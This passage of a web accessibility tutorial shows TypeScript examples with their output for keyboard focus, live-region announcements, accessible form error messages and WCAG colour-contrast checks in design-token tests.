  console.log(key.padEnd(10), "→", document.activeElement?.textContent?.padEnd(6), stops.join(" "));
}
Result
ArrowRight → Link   Bold:-1 Italic:-1 Link:0
ArrowRight → Bold   Bold:0 Italic:-1 Link:-1
ArrowLeft  → Link   Bold:-1 Italic:-1 Link:0
Home       → Bold   Bold:0 Italic:-1 Link:-1

Announce changes with a live region

When content changes away from the focus — a result count, a saved toast — put one short sentence in a status region that was in the page from the start.

import { JSDOM } from "jsdom";
import { getByRole } from "@testing-library/dom";

// the regions exist (empty) before anything changes: a region inserted with its text is often not read.
// .visually-hidden { position: absolute; width: 1px; height: 1px; overflow: hidden;
//                    clip-path: inset(50%); white-space: nowrap; }   — read aloud, not shown
const { window } = new JSDOM(`<!doctype html>
  <label for="filter">Filter orders</label> <input id="filter" type="search">
  <ul id="orders"><li>A-1042 coffee</li><li>A-1043 tea</li><li>A-1044 coffee beans</li></ul>
  <p role="status" class="visually-hidden"></p>
  <p role="alert"></p>`);
const body = window.document.body;

const status = getByRole(body, "status");    // polite: waits until the reader finishes speaking
const alert = getByRole(body, "alert");      // assertive: interrupts — errors only
const rows = Array.from(body.querySelectorAll<HTMLLIElement>("#orders li"));

function filterOrders(query: string): void {
  const shown = rows.filter((row) => {
    row.hidden = !row.textContent!.includes(query);
    return !row.hidden;
  }).length;
  // when filtering as the user types, debounce this write (~500 ms): one count, not one per key
  status.textContent = shown ? `${shown} of ${rows.length} orders shown` : `No orders match "${query}"`;
}

const input = getByRole(body, "searchbox", { name: "Filter orders" }) as HTMLInputElement;
input.addEventListener("input", () => filterOrders(input.value));
for (const typed of ["coffee", "cocoa"]) {
  input.value = typed;
  input.dispatchEvent(new window.Event("input", { bubbles: true }));
  console.log(`status: ${JSON.stringify(status.textContent)}`);
}
alert.textContent = "Could not refresh orders. Check your connection.";
console.log(`alert: ${JSON.stringify(alert.textContent)}`);
Result
status: "2 of 3 orders shown"
status: "No orders match \"cocoa\""
alert: "Could not refresh orders. Check your connection."

  2. npm i jsdom @testing-library/dom
  3. Save as main.mts and run node main.mts — in a browser the same markup and script run on the page

Forms: labels, errors, aria-describedby

On a failed submit: set aria-invalid="true", link the error text with aria-describedby, and move focus to the first invalid field.

import { JSDOM } from "jsdom";
import { getByRole, queryByRole } from "@testing-library/dom";

const { document } = new JSDOM(`<!doctype html>
  <form novalidate>
    <label for="email">Email</label>
    <input id="email" type="email" required aria-describedby="email-hint">
    <p id="email-hint">We send the receipt here.</p>
    <p id="email-error" hidden></p>
    <button>Place order</button>
  </form>`).window;

const form = document.querySelector("form")!;
form.addEventListener("submit", (event) => {
  event.preventDefault();
  const field = form.querySelector<HTMLInputElement>("#email")!;
  const error = form.querySelector<HTMLElement>("#email-error")!;
  const { valueMissing, typeMismatch } = field.validity;
  const message =
    valueMissing ? "Enter your email." : typeMismatch ? "Enter an email like ada@example.com." : "";
  error.textContent = message;
  error.hidden = !message;
  // the error joins the hint in the description; colour alone would tell a screen reader nothing
  field.setAttribute("aria-describedby", message ? "email-hint email-error" : "email-hint");
  // aria-invalid="" means false: write "true", and remove the attribute once the field is valid
  if (message) field.setAttribute("aria-invalid", "true");
  else field.removeAttribute("aria-invalid");
  if (message) field.focus();
});

const body = document.body;
const email = getByRole(body, "textbox", { name: "Email" }) as HTMLInputElement;
for (const typed of ["ada@", "ada@example.com"]) {
  email.value = typed;
  getByRole(body, "button", { name: "Place order" }).click();
  // the description a screen reader reads after the name: the hint, plus the error when there is one
  const errorRead = queryByRole(body, "textbox", { name: "Email", description: /Enter an email/ }) !== null;
  const invalid = JSON.stringify(email.getAttribute("aria-invalid"));   // quoted: "" would be a bug
  console.log(typed.padEnd(15), `aria-invalid=${invalid} focused=${email === document.activeElement}`,
    `error-in-description=${errorRead}`);
}
Result
ada@            aria-invalid="true" focused=true error-in-description=true
ada@example.com aria-invalid=null focused=true error-in-description=false

Check contrast in code

Put the WCAG contrast check in the design-token tests, so a colour change that fails AA fails the build.

// WCAG 2 relative luminance of an sRGB colour such as "#1f2937"
function luminance(hex: string): number {
  const [r = 0, g = 0, b = 0] = [1, 3, 5].map((i) => {
    const channel = parseInt(hex.slice(i, i + 2), 16) / 255;
    return channel <= 0.04045 ? channel / 12.92 : ((channel + 0.055) / 1.055) ** 2.4;
  });
  return 0.2126 * r + 0.7152 * g + 0.0722 * b;
}

function contrast(foreground: string, background: string): number {
  const [lighter = 0, darker = 0] = [luminance(foreground), luminance(background)].sort((a, b) => b - a);
  return (lighter + 0.05) / (darker + 0.05);
}

const tokens: Record<string, [text: string, background: string]> = {
  body: ["#1f2937", "#ffffff"],
  muted: ["#767676", "#ffffff"],
  placeholder: ["#999999", "#ffffff"],
  "button-on-brand": ["#ffffff", "#f97316"],
};
for (const [name, [text, background]] of Object.entries(tokens)) {
  const ratio = contrast(text, background);
  const verdict = ratio >= 4.5 ? "AA" : ratio >= 3 ? "AA large text only" : "fails";
  console.log(`${name.padEnd(16)} ${ratio.toFixed(2).padStart(5)}:1  ${verdict}`);
}
Result
body             14.68:1  AA
muted             4.54:1  AA
placeholder       2.85:1  fails
button-on-brand   2.80:1  fails
